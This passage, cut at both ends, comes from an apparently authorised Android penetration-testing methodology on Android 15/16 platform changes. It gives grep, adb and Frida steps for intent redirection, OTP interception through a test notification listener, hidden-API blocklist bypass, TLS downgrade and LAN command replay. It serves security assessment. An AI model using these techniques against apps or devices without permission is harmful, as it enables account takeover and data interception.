  grep -n 'USE_FULL_SCREEN_INTENT' out/AndroidManifest.merged.xml
  grep -rnE 'setFullScreenIntent|canUseFullScreenIntent|ACTION_MANAGE_APP_USE_FULL_SCREEN_INTENT' out/sources/ -A6
  ```
  ```javascript
  Java.perform(function () {
    var NM = Java.use('android.app.NotificationManager');
    NM.canUseFullScreenIntent.implementation = function () {
      var v = this.canUseFullScreenIntent(); console.log('[fsi] ' + v); return v;
    };
  });
  ```
- **Proof:** A full-screen activity rendered over the lock screen after a notification whose destination
  you influenced (via the client's own FCM project, with permission), recorded on video from the locked
  state.
- **Escalation:** -> D24 for the push injection half; -> D13 for the credential capture.
- **Ruled out when:** The permission is not declared, or `setFullScreenIntent` is called only with a
  hard-coded component and the app is genuinely a calling or alarm app (name the feature). Record the
  call sites and their destinations.

### D22-043 · Non-SDK interface restrictions — and the raw-Binder bypass that means "blocked" is not "unreachable"

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | none directly — rate on the security control that fails open |
| **Attacker** | AM-12 for the bypass technique; the finding is the app's fail-open branch |
| **Applies to** | non-SDK restrictions from Android 9; the blocked set grows each release and is also updated by ART Mainline updates |
| **Maps to** | `about/versions/13/behavior-changes-13`, `.../14/behavior-changes-14`, `.../15/behavior-changes-15` (each carries an "Updated non-SDK restrictions" section and a `/about/versions/NN/changes/non-sdk-NN` page); the Mobile Hacking Lab finding that the hidden-API blocklist is an ART-level check, not a kernel one, and is bypassed by raw `IBinder.transact()` |

- **Test:** Two halves. The **finding**: apps use reflection against hidden APIs for exactly the things
  that matter here — RASP checks, root detection, "get the real IMEI" code — and when a release blocks
  the reflection, the handler is almost always a broad `catch` that fails open, silently disabling the
  check. The **technique**: do not conclude a system API is unreachable because it is blocklisted; the
  blocklist is an ART-level check and raw `IBinder.transact()` bypasses it entirely on stock devices.
- **How:**
  ```bash
  adb logcat -d | grep -iE 'Accessing hidden (method|field)|greylist|blacklist|max-target'
  grep -rnE 'getDeclaredMethod\(|getDeclaredField\(|setAccessible\(true\)|Class\.forName\("android\.|VMRuntime|dalvik\.system\.VMDebug|Unsafe' out/sources/ -A6 | grep -in 'catch'
  # compare behaviour with enforcement relaxed, to find which branch the app depends on:
  adb shell settings put global hidden_api_policy 1
  adb shell settings delete global hidden_api_policy
  ```
- **Proof:** `Accessing hidden method Landroid/...` in logcat from the app's UID, followed by the app
  taking its fallback branch — and the fallback being permissive (the root check returns "clean", the
  pinning check is skipped). Show the branch with a Frida hook on the catch handler's target.
- **Escalation:** -> D21 (a RASP control that fails open on any release that widens the blocklist);
  -> D06 where the raw-Binder route reopens a surface you had written off.
- **Ruled out when:** No reflection against `android.*` internals in the app (grep count zero), or every
  such call site's catch handler fails **closed** (show the branch refusing the operation). Record the
  logcat with no hidden-API warnings across a full drive of the app.

### D22-044 · TLS 1.0/1.1 disallowed at targetSdk 35 — find the stack that re-enables them

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.cleartext_transmission_of_session_token` (P4) where a session token traverses the downgraded channel; the MitM outcome is rated by what it carries |
| **Attacker** | AM-06 |
| **Applies to** | targetSdk >= 35 for the platform restriction; a bundled TLS stack is unaffected at every level |
| **Maps to** | MASTG-TEST-0217 (Insecure TLS Protocols Explicitly Allowed in Code); `about/versions/15/behavior-changes-15` ("Restricted TLS Versions — Disallowed: TLS 1.0 and 1.1… Apps targeting Android 15 cannot use these versions"); `risks/unsafe-trustmanager`; `risks/unsafe-hostname`; MASWE-0026 |

- **Test:** Apps targeting Android 15 cannot negotiate TLS 1.0/1.1 through the platform stack. An app
  that still needs a legacy endpoint will have installed a custom `SSLSocketFactory`, a custom
  `ConnectionSpec`, or bundled its own TLS implementation — and that stack gets none of the platform's
  restrictions and very often ships a permissive trust manager alongside.
- **How:**
  ```bash
  grep -rnE 'SSLContext\.getInstance\("(SSL|SSLv3|TLSv1|TLSv1\.1)"\)|setEnabledProtocols|ConnectionSpec|SSLSocketFactory' out/sources/
  grep -rnE 'X509TrustManager|HostnameVerifier|checkServerTrusted|ALLOW_ALL_HOSTNAME_VERIFIER' out/sources/ -A8
  unzip -l base.apk | grep -iE 'conscrypt|openssl|boringssl|libssl|libcrypto'
  grep -n 'usesCleartextTraffic\|networkSecurityConfig' out/AndroidManifest.merged.xml
  cat out/res/xml/network_security_config.xml 2>/dev/null
  ```
- **Proof:** A `setEnabledProtocols(new String[]{"TLSv1"})` reachable at runtime, confirmed with a Frida
  hook plus a downgrade-capable MitM completing the handshake — or an empty `checkServerTrusted` body.
- **Escalation:** -> D14 for the channel; -> D15 for what the channel carries.
- **Ruled out when:** No bundled TLS library in the APK, no `setEnabledProtocols` call site, and no
  custom `X509TrustManager`, with `targetSdk >= 35`. Paste the three grep results.

### D22-045 · Background activity launch: sender opt-in at 34, creator opt-in at 35

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); the phishing outcome is rated by what the raised UI captures |
| **Attacker** | AM-03 (the party holding the PendingIntent) |
| **Applies to** | targetSdk >= 34 for the sender opt-in; >= 35 for the creator opt-in; `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE` is the recommended mode from SDK 36 |
| **Maps to** | `guide/components/activities/background-starts` (`setPendingIntentBackgroundActivityStartMode()` sender opt-in API 34+; `setPendingIntentCreatorBackgroundActivityStartMode()` creator opt-in API 35+; `MODE_BACKGROUND_ACTIVITY_START_ALLOW_IF_VISIBLE`; `detectBlockedBackgroundActivityLaunch()`; the `realCallingPackage`/`callingPackage` log fields); `about/versions/14/behavior-changes-14`; `.../15/behavior-changes-15` (Secured Background Activity Launches); `Context.BIND_ALLOW_ACTIVITY_STARTS` |

- **Test:** Android 14 required the **sender** of a PendingIntent to opt into background activity
  launches; Android 15 required the **creator** to as well. Both defaults are now deny. An app that
  re-enables it with `MODE_BACKGROUND_ACTIVITY_START_ALLOWED` (rather than the `ALLOW_IF_VISIBLE` mode
  available from SDK 36) has restored an unconditional background-launch capability on exactly the path
  where an attacker-triggered PendingIntent can pull a screen to the foreground at a moment of their
  choosing.
- **How:**
  ```bash
  grep -rnE 'setPendingIntent(Creator)?BackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_(ALLOWED|DENIED|ALLOW_IF_VISIBLE)|BIND_ALLOW_ACTIVITY_STARTS' out/sources/
  adb logcat -s ActivityTaskManager | grep -E 'realCallingPackage|callingPackage|BAL'
  adb logcat -b all | grep -iE 'Background activity (start|launch)|blocked'
  ```
  Runtime triage with the Android 16 detector from D22-009 (`detectBlockedBackgroundActivityLaunch()`).
- **Proof:** `ActivityTaskManager` lines naming `realCallingPackage` (sender) and `callingPackage`
  (creator), with the activity actually appearing on screen while the app was backgrounded — recorded on
  video with the home screen visible immediately before.
- **Escalation:** -> D04 UI redress from the background; -> D08 for the PendingIntent that carries it.
- **Ruled out when:** No opt-in call site exists and the background launch is refused with a logcat BAL
  line on the Android 15/16 images. Show the refusal on both.

### D22-046 · Android 15 force-stop cancels every PendingIntent — a methodology trap and a persistence finding

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | none as a vulnerability; it prevents a false negative in D08 and is rated on the security function that silently stops |
| **Attacker** | AM-01 (the user, or an app that can trigger a force-stop) |
| **Applies to** | Android 15+ |
| **Maps to** | `about/versions/15/behavior-changes-all` (the system cancels all pending intents when an app enters the stopped state; `ApplicationStartInfo.wasForceStopped()`) |

- **Test:** Two sides. As **method**: force-stopping the app between PendingIntent setup and PendingIntent
  trigger invalidates your PoC, and you will conclude "not reproducible" when the finding is real. As a
  **finding**: widgets, alarms and re-arm logic that depend on a PendingIntent silently die after a
  force-stop, which matters when the dead thing was a security function (a session-expiry alarm, a
  device-check heartbeat).
- **How:**
  ```bash
  adb shell dumpsys activity intents | grep -A6 com.target.app      # before
  adb shell am force-stop com.target.app
  adb shell dumpsys activity intents | grep -A6 com.target.app      # after: records gone
  grep -rnE 'wasForceStopped|ApplicationStartInfo|AlarmManager|setExactAndAllowWhileIdle|setInexactRepeating' out/sources/
  ```
- **Proof:** The PendingIntent records present before and absent after in `dumpsys activity intents`,
  paired with the security function not firing at its scheduled time.
- **Escalation:** -> D08 (never force-stop between the two halves of a PendingIntent PoC); -> D13 where
  the cancelled alarm was the session-expiry mechanism.
- **Ruled out when:** The app checks `ApplicationStartInfo.wasForceStopped()` and re-arms on next launch
  (show the re-armed record in `dumpsys activity intents`), or no PendingIntent in the app carries a
  security function. List them.

### D22-047 · OTP redaction from `NotificationListenerService` (Android 15) — and the delivery shapes that route around it

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3); `broken_authentication_and_session_management.authentication_bypass` (P1) when the intercepted code completes a takeover |
| **Attacker** | AM-04 (a co-installed app holding notification-listener access — see D22-023 for the gate) |
| **Applies to** | Android 15+, all apps regardless of targetSdk |
| **Maps to** | `about/versions/15/behavior-changes-all` ("Untrusted apps implementing `NotificationListenerService` cannot read unredacted OTP content from notifications. Trusted companion device associations exempt. System automatically redacts OTPs"); MASTG-TEST-0315 |

- **Test:** Android 15 redacts OTP content from untrusted notification listeners, with trusted
  companion-device associations exempt. Two findings live here. (a) The app under test is a listener
  harvesting OTPs and has obtained a companion-device association specifically to keep reading them.
  (b) The app **sends** OTPs in a shape the redaction heuristics do not catch — the code in the
  notification title rather than the body, in an accessibility node, or on the clipboard.
- **How:**
  ```bash
  grep -nE 'BIND_NOTIFICATION_LISTENER_SERVICE|NotificationListenerService' out/AndroidManifest.merged.xml
  grep -rnE 'NotificationListenerService|CompanionDeviceManager|REQUEST_COMPANION' out/sources/ out/AndroidManifest.merged.xml
  adb shell cmd notification allow_listener com.attacker/.Listener
  adb shell dumpsys notification | grep -iE 'listener|redact'
  adb shell dumpsys notification --noredact | grep -iE 'otp|code|[0-9]{6}'
  ```
  Then trigger the target's OTP and read what your test listener receives.
- **Proof:** A test listener receiving an unredacted six-digit code on Android 15 from the target app's
  notification — which proves the app's OTP delivery falls outside the platform's redaction heuristics —
  followed by that code completing the second factor.
- **Escalation:** -> D13 for the full OTP chapter; account takeover is the impact statement.
- **Ruled out when:** The test listener receives a redacted body on Android 15 **and** the code is absent
  from the title, the clipboard (`adb shell cmd clipboard get` where available) and any accessibility
  node dump (`adb shell uiautomator dump`). Show all three.

### D22-048 · Screen-share protection and `setContentSensitivity` (Android 15)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-02 (a remote-access support or casting session the user was talked into) |
| **Applies to** | Android 15+, all apps |
| **Maps to** | `about/versions/15/behavior-changes-all` (notification content hidden during screen sharing; sensitive password input hidden from remote viewers; `Notification.Builder.setPublicVersion()`; `View.setContentSensitivity(int)`; the Developer Options toggle "Disable screen share protections"; the default system screen recorder is exempt) |

- **Test:** Android 15 hides notification content and password fields from remote viewers during screen
  sharing, and gives apps `View.setContentSensitivity(int)` to mark their own views. A payment screen, a
  PIN pad or a recovery-phrase display that is neither `FLAG_SECURE` nor sensitivity-marked is fully
  visible to whoever is on the other end of the share.
- **How:**
  ```bash
  grep -rnE 'setContentSensitivity|CONTENT_SENSITIVITY_SENSITIVE|FLAG_SECURE|setPublicVersion' out/sources/
  # start a screen share or a MediaProjection test app, then photograph the remote view
  adb shell settings put global disable_screen_share_protections 1   # testing only — record that you did this
  adb shell settings put global disable_screen_share_protections 0
  ```
- **Proof:** Side-by-side captures: the sensitive field visible in the projected stream, and the same
  field redacted after the control is applied in a patched build. Note in the report if you disabled the
  protection to record the evidence.
- **Escalation:** -> D20 disclosure; -> D13 where the visible value is a credential or a one-time code.
- **Ruled out when:** The sensitive view sets `FLAG_SECURE` or a sensitive content-sensitivity value and
  is redacted in the projected stream on an Android 15 device with the developer-options toggle at its
  default. Show the redacted frame.

### D22-049 · Private space (Android 15) — a second profile your enumeration must account for

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) up to P1 where the crossing exposes another user's data; Google's own platform programme names "Multi-User & Private Space: cross-user sensitive data access" as in-scope |
| **Attacker** | AM-05 (another user of the same device/app) |
| **Applies to** | Android 15+ for private space; multi-user from Android 5; work profiles on managed devices |
| **Maps to** | `about/versions/15/behavior-changes-all` (private space is a separate user profile; launcher requirements `ROLE_HOME`, `ACCESS_HIDDEN_PROFILES`, `getLauncherUserInfo()`, `requestQuietModeEnabled()`, `ACTION_PROFILE_AVAILABLE`/`ACTION_PROFILE_UNAVAILABLE`; app stores must declare `android.intent.category.APP_MARKET`); Android & Google Devices programme in-scope impact "Multi-User & Private Space" |

- **Test:** Private space installs apps into a separate, hidden-when-locked user profile. Two
  consequences: an app that assumes "another install of me must be in a work profile" mis-handles it,
  and the data isolation between the private-space copy and the main copy must hold. Test the crossing in
  both directions.
- **How:**
  ```bash
  adb shell pm list users
  adb shell pm list packages --user <privateSpaceUserId> | grep com.target.app
  adb shell am start   --user <privateSpaceUserId> -n com.target.app/.MainActivity
  adb shell content query --user 0 --uri content://<authority>/<path>
  grep -rnE 'ACCESS_HIDDEN_PROFILES|getLauncherUserInfo|requestQuietModeEnabled|ACTION_PROFILE_(AVAILABLE|UNAVAILABLE)|UserHandle|myUserId' out/sources/ out/AndroidManifest.merged.xml
  ```
- **Proof:** Data written by the private-space instance readable from the main-profile instance (or the
  reverse) — via a shared external path, a cloud account keyed only by a device id, or a content provider
  that does not scope its queries by user.
- **Escalation:** -> D11/D20; -> D07 for the provider that fails to scope.
- **Ruled out when:** `content query --user 0` against the provider from the other profile returns
  `Permission Denial` or an empty cursor, and no shared external path carries the app's data. Show both
  queries.

### D22-050 · Foreground-service time limits (Android 15) and the `device_config` compression that makes them testable

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) only when the starved function is a security control and the starvation is attacker-driven; otherwise Support |
| **Attacker** | AM-03 (an app that keeps the target in the background) |
| **Applies to** | Android 15+ |
| **Maps to** | `about/versions/15/behavior-changes-15` (`dataSync`/`mediaProcessing` cumulative six-hour cap; the documented `device_config put activity_manager data_sync_fgs_timeout_duration` command; `FGS_INTRODUCE_TIME_LIMITS`, `FGS_BOOT_COMPLETED_RESTRICTIONS`, `FGS_SAW_RESTRICTIONS` compat changes; the `did not stop within its timeout` ANR string) |

- **Test:** Android 15 caps `dataSync` and `mediaProcessing` foreground services at a cumulative six
  hours in a 24-hour window, blocks several FGS types from launching on `BOOT_COMPLETED`, and requires a
  `SYSTEM_ALERT_WINDOW` overlay to actually be visible for the SAW FGS path. Any security function built
  on "our sync service is always running" degrades. The six-hour window is compressible, so the PoC fits
  inside the engagement.
- **How:**
  ```bash
  adb shell device_config put activity_manager data_sync_fgs_timeout_duration 3600000
  adb shell device_config get activity_manager data_sync_fgs_timeout_duration
  adb shell device_config list activity_manager | head -40
  adb shell am compat enable FGS_INTRODUCE_TIME_LIMITS com.target.app
  adb shell am compat enable FGS_BOOT_COMPLETED_RESTRICTIONS com.target.app
  adb logcat -d | grep -E 'ForegroundServiceStartNotAllowedException|did not stop within its timeout'
  ```
- **Proof:** `ForegroundServiceStartNotAllowedException` reproduced inside the engagement window, with
  the security function (revocation poll, device-binding heartbeat, DLP scan) demonstrably not running
  afterwards and not re-arming on boot.
- **Escalation:** -> D06 services; -> D21 where the starved function was the RASP or attestation loop;
  pair with D22-027 for the user-initiated stop half.
- **Ruled out when:** The security function is enforced server-side on the next request rather than by
  the FGS, or it re-arms through a `WorkManager` job with its own constraints. Demonstrate the re-arm
  after the timeout fires.

### D22-051 · Edge-to-edge and large-screen layout enforcement hiding a security affordance

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `mobile_security_misconfiguration.tapjacking` (P5) is the nearest mobile path and is Informational; report through the transaction the user confirmed without seeing its terms (-> D23) |
| **Attacker** | AM-01 (no actor — the platform change is the cause) |
| **Applies to** | targetSdk >= 35 for edge-to-edge by default; targetSdk >= 36 disables the `windowOptOutEdgeToEdgeEnforcement` opt-out and ignores orientation/aspect-ratio locks on `sw600dp`+ displays (games are excepted) |
| **Maps to** | `about/versions/15/behavior-changes-15` (edge-to-edge default; `Window.setStatusBarColor()` and friends become no-ops; `Configuration.screenWidthDp`/`screenHeightDp`/`orientation` now include the system bars); `about/versions/16/behavior-changes-16` (`R.attr#windowOptOutEdgeToEdgeEnforcement` deprecated and disabled; `android:screenOrientation`, `android:resizableActivity`, `android:minAspectRatio`, `android:maxAspectRatio` and `Activity#setRequestedOrientation()` ignored at `sw600dp`+; opt-out `<property android:name="android.window.PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY" android:value="true"/>`, temporary and not applying at API 37+) |

- **Test:** Two layout enforcements, one consequence: UI redress by layout rather than by overlay.
  Security-relevant content — a transaction amount, a consent sentence, a "secure connection" indicator,
  a masked field — can end up drawn under a system bar or revealed by a geometry the developer never
  tested, while the confirm button stays tappable.
- **How:**
  ```bash
  grep -rnE 'windowOptOutEdgeToEdgeEnforcement|setDecorFitsSystemWindows|setStatusBarColor|setNavigationBarColor' out/res/ out/sources/
  grep -nE 'screenOrientation|minAspectRatio|maxAspectRatio|resizeableActivity|PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY' out/AndroidManifest.merged.xml
  ```
  Run the sensitive screen on Android 15 and 16, with gesture navigation and with three-button
  navigation, and on an `sw600dp`+ AVD in both orientations. Capture every combination.
- **Proof:** A screenshot in which the confirmation amount or the consent text is clipped behind a system
  bar (or a masked field is fully readable in landscape on a large screen) while the confirm control
  remains tappable.
- **Escalation:** -> D23 payment-confirmation ambiguity; -> D20 for the disclosure variant.
- **Ruled out when:** The sensitive screen applies window insets (show the `setOnApplyWindowInsetsListener`
  call site or the `fitsSystemWindows` attribute) and renders identically across all four
  navigation/orientation combinations at both API levels. File the four captures.

### D22-052 · Intent-redirection hardening on by default at Android 16 — grep `removeLaunchSecurityProtection()`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the re-enabled redirect reaches an authenticated action; the primitive lands at `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03; AM-02 for the deep-link delivery variant |
| **Applies to** | Android 16+ (API 36), **all apps regardless of targetSdk** |
| **Maps to** | `privacy-and-security/risks/intent-redirection` ("Android 16 introduces by-default security hardening for intent redirection exploits"; `removeLaunchSecurityProtection()`; "Only opt out when absolutely necessary"); `about/versions/16/behavior-changes-all` ("Improved security against Intent redirection attacks"); CWE-926, CWE-927; ATT&CK T1626 |

- **Test:** Android 16 blocks the nested-intent launch class by default for every app on the device.
  There is exactly one documented way to turn it off, and it is a method call on the nested intent. Its
  presence in a shipped app is a deliberate, greppable re-enablement of the pattern the platform now
  blocks — and it is the single highest-yield grep in this chapter.
- **How:**
  ```bash
  grep -rn 'removeLaunchSecurityProtection' out/sources/
  # also check for it reached by reflection, which decompilers render as a string:
  grep -rn '"removeLaunchSecurityProtection"' out/sources/
  ```
  Then send the classic nested intent from a stub app (more reliable than the URI form) and confirm
  delivery on Android 16:
  ```bash
  adb shell am start -n com.target.app/.RedirectActivity \
    --es dummy x --ei code 1 \
    -e sub_intent 'intent:#Intent;component=com.target.app/.internal.Secret;end'
  adb shell dumpsys activity activities | grep -B2 -A8 'internal.Secret'
  ```
- **Proof:** The internal component launching on an Android 16 device where the identical payload is
  blocked against a build without the call — the two-run pair from D22-006, both captured.
- **Escalation:** -> D08 for the full redirection matrix; -> D07 non-exported provider access; -> D04
  internal-activity abuse. The consumer report is where the P1 lives.
- **Ruled out when:** The string does not appear in `out/sources/` (record the grep count) and the nested
  payload is refused on the Android 16 image while landing on the Android 13 image — which tells you the
  class is LEGACY-live on the client's older fleet and belongs in D08 with that precondition stated.

### D22-053 · `android:intentMatchingFlags` — the opt-in, and the per-component opt-out that undoes it

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 16 (API 36); settable on `<application>`, `<activity>`, `<activity-alias>`, `<receiver>`, `<service>` and `<provider>`, with the component value overriding the application value |
| **Maps to** | `about/versions/16/behavior-changes-16` (values `enforceIntentFilter`, `none`, `allowNullAction`; `none` disables all special matching rules and takes precedence; the logcat filter `tag:PackageManager & (message:"Intent does not match component's intent filter:" \| message:"Access blocked:")`); the per-element manifest reference pages |

- **Test:** Android 16 lets an app opt into strict matching with
  `android:intentMatchingFlags="enforceIntentFilter"` — which makes cross-app **explicit** intents match
  the target's filter and rejects action-less intents. It also ships `"none"`, which disables all the
  special matching rules and takes precedence, and `"allowNullAction"`, which re-permits action-less
  intents. The pattern worth finding is an app that sets `enforceIntentFilter` at application level and
  then punches a hole with `"none"` on one component.
- **How:**
  ```bash
  grep -nB4 -A8 'intentMatchingFlags' out/AndroidManifest.merged.xml
  adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
  # action-less and non-matching explicit intents against the flagged component and a sibling:
  adb shell am broadcast -n com.target.app/.MyReceiver --es payload zzq4hd2k9pq
  adb shell am start     -n com.target.app/.TheActivity -a bogus.action
  ```
- **Proof:** The component carrying `intentMatchingFlags="none"` inside an `enforceIntentFilter`
  application, its `onReceive`/`onCreate` running for a non-matching or action-less intent, and **no**
  `Access blocked:` line for it in logcat while a sibling component does produce one. Both logcat
  captures.
- **Escalation:** -> D05 receiver injection; -> D08 redirection; merge the report with the finding the
  relaxation enables.
- **Ruled out when:** The attribute does not appear in the merged manifest at all (record the grep
  count), or it appears only as `enforceIntentFilter` with no `none`/`allowNullAction` anywhere, and the
  `Access blocked:` line fires for your non-matching intent. Capture the line.

### D22-054 · Ordered-broadcast priority scope no longer global (Android 16)

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | none — it changes the applicability of a D05 finding |
| **Attacker** | AM-03 |
| **Applies to** | device API >= 36 |
| **Maps to** | `guide/components/broadcasts` (Android 16 priority changes); `about/versions/16/behavior-changes-all` ("Ordered broadcast priority scope no longer global"): priorities are honoured only within one app's process and are clamped to `IntentFilter.SYSTEM_LOW_PRIORITY + 1` .. `SYSTEM_HIGH_PRIORITY - 1`, with only system components permitted the extremes |

- **Test:** The classic ordered-broadcast interception — register at a very high `android:priority` and
  `abortBroadcast()` before the victim sees it — is no longer guaranteed across processes on Android 16.
  Re-run any D05 interception PoC on both Android 15 and Android 16 and report with the version
  precondition stated, otherwise the triager marks it not reproducible on the first attempt.
- **How:**
  ```bash
  grep -nB2 -A6 'android:priority' out/AndroidManifest.merged.xml
  grep -rnE 'setPriority\(|SYSTEM_HIGH_PRIORITY|SYSTEM_LOW_PRIORITY|abortBroadcast\(' out/sources/
  for S in $(adb devices | awk '/device$/{print $1}'); do
    API=$(adb -s "$S" shell getprop ro.build.version.sdk | tr -d '\r')
    echo "== api=$API"; adb -s "$S" shell am broadcast -a com.target.app.ACTION_X --es payload zzq4hd2k9pq
  done
  ```
- **Proof:** Interception succeeding on the API 35 image and failing on the API 36 image, with both
  outputs captured — and the report line stating the affected device population.
- **Escalation:** -> D05 for the interception itself.
- **Ruled out when:** The app sends no ordered broadcasts (`sendOrderedBroadcast` grep count zero) and
  declares no `android:priority` on any receiver. Record both counts.

### D22-055 · Predictive back at targetSdk 36 — the security gate inside `onBackPressed()` that stopped running

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) for the residual-state framing; report through what the retained value is — a PAN or an OTP left in a field is `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-11 (whoever next holds the unlocked device) / AM-01 (no actor — the control simply stopped) |
| **Applies to** | targetSdk >= 36 on Android 16; also verify on Android 15 where the animations are default-on for opted-in apps |
| **Maps to** | `about/versions/16/behavior-changes-16` (predictive back is default at targetSdk 36; "`onBackPressed()` is no longer called"; "`KeyEvent.KEYCODE_BACK` is not dispatched"; `android:enableOnBackInvokedCallback`); `guide/navigation/custom-back/predictive-back-gesture` (`OnBackInvokedCallback`, `OnBackPressedCallback`, priority constants) |

- **Test:** At targetSdk 36 the system enables predictive back by default: `onBackPressed()` is no longer
  called and `KEYCODE_BACK` is not dispatched. Apps that implemented a security control inside
  `onBackPressed()` — lock-on-back, clear-the-sensitive-buffer, confirm-before-leaving-payment — lose it
  silently unless they migrated to `OnBackInvokedCallback`/`OnBackPressedCallback`. This is a control
  removed by a platform change, with no code change and no test failure.
- **How:**
  ```bash
  grep -rn 'onBackPressed\|KEYCODE_BACK' out/sources/ | grep -v 'OnBackPressedCallback\|OnBackInvokedCallback'
  grep -n 'enableOnBackInvokedCallback' out/AndroidManifest.merged.xml
  ```
  Then on an Android 16 device with targetSdk 36, drive the sensitive screen and swipe back while hooking
  the clearing method:
  ```javascript
  Java.perform(function () {
    var A = Java.use('com.target.app.payment.CardEntryActivity');
    A.clearSensitiveBuffers.implementation = function () {
      console.log('[clear] invoked'); return this.clearSensitiveBuffers();
    };
  });
  ```
- **Proof:** The hook never firing on a back gesture at targetSdk 36 while it fires at targetSdk 35 — or,
  without a hook, re-entering the screen and finding the PAN/OTP field pre-filled after a back gesture.
- **Escalation:** -> D11 residual sensitive data in UI state; -> D13 where the retained value is a
  one-time code.
- **Ruled out when:** The app declares `android:enableOnBackInvokedCallback="true"` and registers an
  `OnBackPressedCallback`/`OnBackInvokedCallback` on the sensitive screen, and the clearing hook fires on
  the back gesture at targetSdk 36. Show the hook log.

### D22-056 · `PRIORITY_SYSTEM_NAVIGATION_OBSERVER` used as a gate it cannot be

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.bypass_of_password_confirmation.change_password` (P4) where the un-consumed confirmation guarded a credential change; otherwise rated on the action |
| **Attacker** | AM-01 |
| **Applies to** | Android 16+ |
| **Maps to** | `guide/navigation/custom-back/predictive-back-gesture` (`PRIORITY_SYSTEM_NAVIGATION_OBSERVER` is observer-only and does not consume the event) |

- **Test:** Android 16 added an observer-only back priority. Code that registers a "confirm before
  leaving" handler at this priority runs its logic and the navigation proceeds anyway — so the dialog
  appears while the activity finishes, and the guarded action completes or is abandoned without the
  user's answer being honoured.
- **How:**
  ```bash
  grep -rn 'PRIORITY_SYSTEM_NAVIGATION_OBSERVER' out/sources/ -B6 -A10
  ```
  Then drive the screen that registers it and press back.
- **Proof:** The confirmation dialog appearing while the activity simultaneously finishes, on video.
- **Escalation:** -> D15 unintended-action / business-logic bypass; -> D23 where the un-confirmed action
  is a payment.
- **Ruled out when:** No use of the constant (grep count zero), or every registration at that priority is
  paired with a separate consuming callback at `PRIORITY_DEFAULT`/`PRIORITY_OVERLAY` that actually blocks
  the navigation. Show the back gesture being consumed.

### D22-057 · Local network permission (Android 16) and the `RESTRICT_LOCAL_NETWORK` compat phase

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.privilege_escalation` (null) where the LAN protocol lets you control a device; the discovery half is Support |
| **Attacker** | AM-06 (an attacker on the same LAN) |
| **Applies to** | device API >= 36 for the gate; the protocol weakness applies at every level |
| **Maps to** | `about/versions/16/behavior-changes-16` (local network access gated behind `android.permission.NEARBY_WIFI_DEVICES`; the address ranges IPv4 `169.254.0.0/16`, `100.64.0.0/10`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, IPv6 link-local, directly-connected routes, stub networks, multicast, broadcast `255.255.255.255`; cellular and VPN excluded; DNS to the local DNS server on port 53 exempt; the compat flag `RESTRICT_LOCAL_NETWORK`; the denial strings `sendto failed: EPERM (Operation not permitted)` and `sendto failed: ECONNABORTED (Operation not permitted)`; opt-in phase 25Q2-26Q2) |

- **Test:** Android 16 gates raw sockets to RFC1918 and link-local ranges, mDNS, SSDP, `NsdManager` and
  local unicast/multicast/broadcast behind `NEARBY_WIFI_DEVICES`. Use the compat flag offensively: it
  makes the app confess exactly which local-network behaviour it has, which is how you find undocumented
  control channels to LAN devices. The finding is the unauthenticated protocol, not the permission.
- **How:**
  ```bash
  grep -n 'NEARBY_WIFI_DEVICES' out/AndroidManifest.merged.xml
  adb shell am compat enable RESTRICT_LOCAL_NETWORK com.target.app && adb reboot
  adb logcat | grep -E 'sendto failed: (EPERM|ECONNABORTED)'
  grep -rnE 'NsdManager|MulticastSocket|DatagramSocket|SSDP|mDNS|239\.255\.255\.250|224\.0\.0|255\.255\.255\.255' out/sources/
  ```
  Then capture the traffic on the AP and replay the command from another host:
  ```bash
  tcpdump -i <ap-iface> -w /tmp/lan.pcap 'net 192.168.0.0/16 or net 10.0.0.0/8'
  ```
- **Proof:** The `sendto failed: EPERM` lines identifying the app's local-network call sites, plus a pcap
  showing an unauthenticated control command to a device on the LAN, plus that command replayed
  successfully from a second host.
- **Escalation:** -> D25 device/firmware surfaces; -> D06 for the local socket server side.
- **Ruled out when:** The app issues no local-network traffic under the compat flag (no `sendto failed`
  lines across a full drive), or every LAN protocol it speaks is authenticated (show the auth material in
  the pcap). Record the pcap and the logcat.

### D22-058 · `KeyStoreManager.grantKeyAccess()` (Android 16) — Keystore keys shared across UIDs

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cryptographic_weakness.key_reuse.inter_environment` (P2) for the shared-key framing; `broken_authentication_and_session_management.authentication_bypass` (P1) when the shared key signs authentication assertions |
| **Attacker** | AM-08 (the grantee) |
| **Applies to** | Android 16+ (API 36) |
| **Maps to** | `about/versions/16/features` (`KeyStoreManager`, `grantKeyAccess(String, int)`, `revokeKeyAccess(String, int)`; "Share access to Android Keystore keys with other apps") |

